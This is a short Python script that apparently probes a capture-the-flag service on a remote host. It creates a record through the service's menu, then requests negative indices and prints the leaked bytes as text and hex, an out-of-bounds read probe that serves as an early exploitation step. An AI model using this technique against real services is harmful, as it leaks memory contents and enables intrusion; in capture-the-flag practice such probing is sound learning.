import socket
import time
import binascii

HOST = "host5.metaproblems.com"
PORT = 5020

TARGETS = [-5, -1, -3, -9]


def recv_all(s, timeout=1.0):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    return data


def probe_index(idx):
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
    except Exception as e:
        print("[!] connect failed", e)
        return
    print("[*] connected for index", idx)
    print(recv_all(s, 1).decode(errors="ignore"))
    # create a book
    s.sendall(b"1\n")
    time.sleep(0.1)
    _ = recv_all(s, 0.5)
    s.sendall(b"A\n")
    time.sleep(0.1)
    _ = recv_all(s, 0.5)
    s.sendall(b"1\n")
    time.sleep(0.1)
    _ = recv_all(s, 0.5)
    # now read target index
    s.sendall(b"3\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.2)
    s.sendall(str(idx).encode() + b"\n")
    time.sleep(0.5)
    data = recv_all(s, 1.0)
    if not data:
        print(f"[{idx}] no data")
    else:
        print(f"[{idx}] {len(data)} bytes")
        try:
            print("TEXT PREVIEW:", data.decode(errors="ignore")[:300])
        except Exception:
            pass
        print("HEX:", binascii.hexlify(data).decode())
    s.close()


for t in TARGETS:
    probe_index(t)
    time.sleep(0.2)
